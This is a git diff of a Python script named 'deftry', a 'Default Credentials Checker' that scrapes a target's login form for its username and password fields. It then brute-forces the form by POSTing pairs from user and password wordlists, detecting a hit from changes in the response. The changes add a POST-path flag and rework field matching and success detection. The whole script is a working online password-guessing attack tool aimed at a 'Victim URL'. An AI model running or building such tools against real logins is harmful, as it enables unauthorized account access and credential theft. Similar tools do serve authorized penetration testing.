@@ -4,6 +4,7 @@ import requests
 import re
 import argparse
 import signal
+import sys
 from pwn import *
 from replit import clear
 
@@ -28,6 +29,7 @@ oneliner = "                                         \r"
 def parse_flags():
     parser = argparse.ArgumentParser(description='Default Credentials Checker')
     parser.add_argument('-u', required=True, help='URL', dest="url", metavar="[Victim URL]")
+    parser.add_argument('-p', required=False, help='POST url', dest="post", metavar="[POST url]")
     parser.add_argument('-uw', required=False, help='Users Wordlist (Must be a list with value per line)', dest="inputuserdic", default=None, metavar="[/usr/share/example]")
     parser.add_argument('-pw', required=False, help='Password Wordlist (Must be a list with value per line)', dest="inputpassdic", default=None, metavar="[/usr/share/example]")
     parser.add_argument('-nc', required=False, help='No errors checks to compare', dest="nocheck", metavar="")
@@ -47,7 +49,9 @@ def conn(url, method, payload=None):
 # Prevent relative path python issues
 def abspath(file):
     path = __file__
-    path = path.split("\\")
+    if "\\" in path:
+        path = path.replace("\\", "/")
+    path = path.split("/")
     del path[-1]
     path = "/".join(path) + "/" + file
     return path
@@ -77,7 +81,6 @@ def match_field(field, dic):
     dict = read_dict(dic)
     for i in field:
         for n in dict:
-            print(i, n)
             if i == n:
                 matched_field = i
             else:
@@ -115,19 +118,27 @@ def get_fields(args, usr, pwd):
     url = args.url
     login = conn(url, "get")
     #usr_field = re.findall(r"<input type=\"text\" name=\"(.*?)\"", login.text)
-    usr_element = re.findall(r"<input type=\"text\".*?name=\".*?\".*?id=\".*?\".*?>", login.text)
+    usr_element = re.findall(r"<input type=\"text\".*?name=\".*?\".*?>", login.text)
     #pass_field = re.findall(r"<input type=\"password\" name=\"(.*?)\"", login.text)
-    pass_element = re.findall(r"<input type=\"password\".*?name=\".*?\".*?id=\".*?\".*?>", login.text)
+    pass_element = re.findall(r"<input type=\"password\".*?name=\".*?\".*?>", login.text)
     usr_field = re.findall(r" (.*?=\".*?\")", usr_element[0])
     pass_field = re.findall(r" (.*?=\".*?\")", pass_element[0])
     usr_field = no_empty(usr_field)
     pass_field = no_empty(pass_field)
     if len(usr_field) > 1:
         print(f"{fg.BLUE}More than 1 element for username match!!{fg.RESET}\n")
+        listlen = len(usr_field) + 4
         usr_field = choice(usr_field)
+        p1.status(f"{fg.RED}{usr_field}{fg.RESET}")
+        for i in range(listlen, -1, -1):
+            sys.stdout.write("\033[F")
     if len(pass_field) > 1:
         print(f"{fg.BLUE}More than 1 element for password match!!{fg.RESET}\n")
+        listlen = len(pass_field) + 4
         pass_field = choice(pass_field)
+        p1.status(f"{fg.RED}{usr_field}{fg.RESET}{fg.YELLOW}:{fg.RESET}{fg.RED}{pass_field}{fg.RESET}")
+        for i in range(listlen, -1, -1):
+            sys.stdout.write("\033[F")
     else:
         if usr_field == None:
             usr_field = match_field(usr_field, usr)
@@ -135,25 +146,20 @@ def get_fields(args, usr, pwd):
             pass_field = match_field(pass_field, pwd)
     if usr_field == None or pass_field == None:
         print(f"\n\n\n{fg.RED}[!] Cant find any good login field, sorry...\n{fg.RESET}"); exit(1)
-    p1.success
     usr_field = re.findall(r".*?=\"(.*?)\"", usr_field)
     pass_field = re.findall(r".*?=\"(.*?)\"", pass_field)
-    print(f'{fg.GREEN}Got the correct fields lucky bastard!: ' + f"\"{usr_field[0]}\" & \"{pass_field[0]}\"\n{fg.RESET}")
+    p1.success(f': {fg.GREEN}Got the correct fields lucky bastard!: ' + f"\"{usr_field[0]}\" & \"{pass_field[0]}\"\n{fg.RESET}")
+    
     return (usr_field[0], pass_field[0])
 
    
 def get_error_values(response):
     error_chars = len(response.text)
     error_lines = len(response.text.splitlines())
-    if response.status_code != 200 and not (301 <= response.status_code <= 308):
-        error_response = response.status_code
-    else:
-        error_response = 401
     errors = {
         "chars": error_chars,
-        "lines": error_lines,
-        "response": error_response
-    }
+        "lines": error_lines
+     }
     return errors
     
 
@@ -161,13 +167,13 @@ def check_errors(r, errors):
     r_err = get_error_values(r)
     chars = abs(r_err["chars"] - errors["chars"])
     lines = abs(r_err["lines"] - errors["lines"])
-    if chars > 20 or lines > 3 or r_err["response"] == errors["response"]:
-        return False
-    else:
+    if chars > 20 or lines > 3:
         return True
+    else:
+        return False
 
 
-def brute_force(usr_field, pass_field, url, usrdic, passdic, errors=None):
+def brute_force(usr_field, pass_field, url, usrdic, passdic, errors):
     p2 = log.progress(f'{fg.YELLOW}Applying brute force{fg.YELLOW}')
     userdict = read_dict(usrdic)
     passdict = read_dict(passdic)
@@ -178,14 +184,14 @@ def brute_force(usr_field, pass_field, url, usrdic, passdic, errors=None):
             response = conn(url, "post", payload)
             print(oneliner, end="")
             if errors != None:
-                if check_errors(response, errors) == True:
-                    p2.status(f'{fg.GREEN}Gotcha!!{fg.RESET}')
-                    print(f"{fg.GREEN}{payload[f'{usr_field}']}:{payload[f'{pass_field}']}{fg.RESET}")
+                check = check_errors(response, errors)
+                if check == True:
+                    p2.success(f"{fg.GREEN}Gotcha!!: {fg.RESET}{fg.GREEN}{payload[f'{usr_field}']}:{payload[f'{pass_field}']}{fg.RESET}")
                     break
                 else:
                     continue
-            
-
+        if check == True:
+            break
 def main():
     # Print Headers and read flags
     print(f"\n{fg.MAGENTA}[*] Welcome to deftry{fg.RESET}")
@@ -203,14 +209,19 @@ def main():
         passdic = args.inputpassidc
     
     # Get the correct fields
-    usr_field, pass_field = get_fields(args, usrfielddic, passfielddic)
+    if args.post:
+        usr_field, pass_field = get_fields(args, usrfielddic, passfielddic)
+        if not "/" in args.post:
+            args.post = "/" + args.post
+        args.url = args.url + args.post
+    else:
+        usr_field, pass_field = get_fields(args, usrfielddic, passfielddic)
     if not args.nocheck:  # This is if user dont want to check the response for autodetect a correct input
         error_payload = make_payload(usr_field, pass_field)
         err_response = conn(args.url, "post", error_payload)
         errors = get_error_values(err_response)
     else:
         errors= None
-    
     # Start the brute force
     brute_force(usr_field, pass_field, args.url, usrdic, passdic, errors)
 
